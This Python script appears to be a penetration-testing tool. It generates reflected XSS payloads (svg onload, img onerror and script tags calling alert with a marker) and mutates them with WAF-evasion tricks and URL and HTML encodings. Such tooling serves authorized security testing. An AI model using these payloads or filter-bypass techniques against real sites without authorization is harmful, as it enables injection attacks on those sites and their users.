#!/usr/bin/env python3
import argparse
import json
import random
import string
from dataclasses import dataclass, asdict
from html import escape as html_escape
from urllib.parse import quote


# ----------------------------
# Core transforms / encoders
# ----------------------------
def url_encode_once(s: str) -> str:
    return quote(s, safe="")

def url_encode_twice(s: str) -> str:
    return quote(quote(s, safe=""), safe="")

def html_entity_encode_basic(s: str) -> str:
    # Encode only special characters to keep it readable
    return (s.replace("&", "&amp;")
             .replace("<", "&lt;")
             .replace(">", "&gt;")
             .replace('"', "&quot;")
             .replace("'", "&#x27;"))

def random_case(s: str) -> str:
    out = []
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if random.random() < 0.5 else ch.lower())
        else:
            out.append(ch)
    return "".join(out)

def insert_html_comments(s: str) -> str:
    # simple obfuscation: split tags/keywords with comments
    # e.g. <svg/onload=alert(1)> -> <sv<!--x-->g/onlo<!--x-->ad=alert(1)>
    needles = ["svg", "script", "onload", "onerror", "alert"]
    for n in needles:
        s = s.replace(n, n[:2] + "<!--x-->" + n[2:])
    return s

def space_to_tabs_newlines(s: str) -> str:
    return s.replace(" ", random.choice(["\t", "\n", "\r\n"]))

def null_byte_injection(s: str) -> str:
    # sometimes used in legacy filters; harmless as a string generator
    return s.replace("on", "o%00n")

def add_random_prefix_suffix(s: str) -> str:
    # useful when you want to embed into contexts
    pre = random.choice(['"', "'", ">", "]]>", "</title>"])
    suf = random.choice(["", "<!--", "/*", "//"])
    return pre + s + suf

def gen_marker(length=6) -> str:
    return "X" + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))


# ----------------------------
# Base payload templates
# ----------------------------
def base_payloads(marker: str):
    # Keep to safe, standard patterns for reflected contexts
    return [
        f'"><svg/onload=alert("{marker}")>',
        f"'><svg/onload=alert('{marker}')>",
        f"</script><svg/onload=alert('{marker}')>",
        f'"><img src=x onerror=alert("{marker}")>',
        f"<svg><script>alert('{marker}')</script>",
        f'"><iframe srcdoc="<svg onload=alert(`{marker}`)>"></iframe>',
    ]


# ----------------------------
# WAF-bypass variations (heuristic)
# ----------------------------
WAF_VARIANTS = [
    ("random_case", random_case),
    ("html_comments", insert_html_comments),
    ("weird_whitespace", space_to_tabs_newlines),
    ("null_byte_like", null_byte_injection),
    ("prefix_suffix", add_random_prefix_suffix),
]

ENCODINGS = [
    ("raw", lambda x: x),
    ("url", url_encode_once),
    ("double_url", url_encode_twice),
    ("html_entities", html_entity_encode_basic),
]

@dataclass
class PayloadItem:
    category: str
    variant: str
    encoding: str
    payload: str
    note: str

def generate(count_base: int, enable_waf: bool, enable_enc: bool, seed: int | None):
    if seed is not None:
        random.seed(seed)

    marker = gen_marker()
    bases = base_payloads(marker)[:max(1, count_base)]

    results: list[PayloadItem] = []

    # Base payloads
    for p in bases:
        results.append(PayloadItem(
            category="reflected_base",
            variant="base",
            encoding="raw",
            payload=p,
            note="Baseline reflected XSS payload template"
        ))

    # WAF variants
    waf_list = WAF_VARIANTS if enable_waf else []
    enc_list = ENCODINGS if enable_enc else [("raw", lambda x: x)]

    for base in bases:
        for vname, vfunc in waf_list:
            mutated = vfunc(base)
            for ename, enc in enc_list:
                results.append(PayloadItem(
                    category="waf_variant",
                    variant=vname,
                    encoding=ename,
                    payload=enc(mutated),
                    note="Heuristic WAF-evasion style mutation (manual validation required)"
                ))

    # Encoded base (without WAF) – useful for contexts
    if enable_enc:
        for base in bases:
            for ename, enc in enc_list:
                if ename == "raw":
                    continue
                results.append(PayloadItem(
                    category="encoded_base",
                    variant="base",
                    encoding=ename,
                    payload=enc(base),
                    note="Encoded baseline payload for filter/context testing"
                ))

    meta = {
        "marker": marker,
        "counts": {
            "base": len(bases),
            "total": len(results),
            "waf_enabled": enable_waf,
            "encoding_enabled": enable_enc
        },
        "disclaimer": "Payloads are generated for authorized testing only. Always validate manually in context."
    }

    return meta, results


def main():
    ap = argparse.ArgumentParser(description="Burp-like XSS Payload Generator (payload-only, no exploitation)")
    ap.add_argument("-n", "--base-count", type=int, default=6, help="How many base templates to use (default 6)")
    ap.add_argument("--no-waf", action="store_true", help="Disable WAF-bypass variants")
    ap.add_argument("--no-enc", action="store_true", help="Disable encoding variants")
    ap.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility")
    ap.add_argument("-o", "--out", default="payloads.json", help="Output JSON filename")
    ap.add_argument("--print", action="store_true", help="Print payloads to stdout")
    args = ap.parse_args()

    meta, items = generate(
        count_base=args.base_count,
        enable_waf=not args.no_waf,
        enable_enc=not args.no_enc,
        seed=args.seed,
    )

    output = {
        "meta": meta,
        "payloads": [asdict(i) for i in items]
    }

    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)

    if args.print:
        for i in items:
            print(i.payload)

    print(f"[+] Generated {meta['counts']['total']} payload(s) -> {args.out}")
    print(f"[i] Marker used: {meta['marker']}")

if __name__ == "__main__":
    main()
